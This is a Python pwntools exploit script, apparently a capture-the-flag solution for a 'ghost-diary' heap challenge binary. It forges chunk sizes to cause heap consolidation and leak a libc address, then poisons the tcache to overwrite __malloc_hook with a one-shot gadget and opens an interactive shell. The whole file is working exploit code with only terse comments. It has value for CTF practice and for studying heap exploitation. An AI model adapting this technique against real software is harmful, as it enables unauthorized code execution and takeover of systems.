from pwn import *


local = True

if local:
    p = process("/problems/ghost-diary_4_e628b10cf58ea41692460c7ea1e05578/ghostdiary")
    #context.terminal = ["tmux", "sp", "-h"]
    #context.log_level = "debug"
    #gdb.attach(p)
else:
    p = remote("127.0.1.1",1337)

b = ELF("/problems/ghost-diary_4_e628b10cf58ea41692460c7ea1e05578/ghostdiary")
l = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def new_page(idx,size):
    p.sendlineafter("> ", "1")
    p.sendlineafter("> ", str(idx))
    p.sendlineafter("size: ", str(size))

def talk_(idx,content):
    p.sendlineafter("> ", "2")
    p.sendlineafter("Page: ", str(idx))
    p.sendlineafter("Content: ", content)

def listen_(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("Page: ", str(idx))

def burn_(idx):
    p.sendlineafter("> ", "4")
    p.sendlineafter("Page: ", str(idx))

def go_sleep(idx):
    p.sendlineafter("> ", "5")
    p.sendlineafter("> ", str(idx))


for _ in range(7):
    new_page(1,240)

new_page(1,240) # 7
new_page(1,152) # 8
new_page(1,240) # 9
new_page(1,24) # 10


for _ in range(7): ## FILL TCACHE BIN
    burn_(_)


burn_(7)

chunk = "A"*144+p64(0x1a0)

talk_(8,chunk)
burn_(9)    # CONSOLIDATING CHUNK[7] WITH CHUNK[9]


for _ in range(7):
    new_page(1,240) ## CLEANING TCACHE BIN


new_page(1,240) # ALIGN CONSOLIDATE CHUNK TO CHUNK[8] (NOT FREE)

log.info("LEAKING ADDRESSES")

listen_(8) # LEAK

p.recvuntil("Content: ")

leak = (u64(p.recv(7).strip("\n").ljust(8,'\x00')) - 0xca0) - 0x3eb000
malloc_hook = leak + l.sym['__malloc_hook']
one_shot = leak + 0x10a38c

log.success("LIBC BASE @: %#x" % leak)
log.success("__MALLOC_HOOK @ LIBC: %#x" % malloc_hook)
log.success("ONE SHOT GADGET @: %#x" % one_shot)

new_page(1,240) # 9
new_page(1,152) # 10
new_page(1,240) # 12
new_page(1,24)


for _ in range(7):
    burn_(_)

burn_(9)

chunk = "B"*16+p64(0x1c0)

talk_(10,chunk)
burn_(12)

burn_(10)

for _ in range(7):
    new_page(1,240)

new_page(2,448)

chunk = "A"*416 + p64(malloc_hook)

talk_(9,chunk)

new_page(1,24)
new_page(1,24) ## MALLOC_HOOOOOK!!!!!!!

log.info("OVERWRITING MALLOC HOOK WITH SYSTEM")

talk_(12,p64(one_shot) + "\n")

new_page(1,24)

p.interactive()
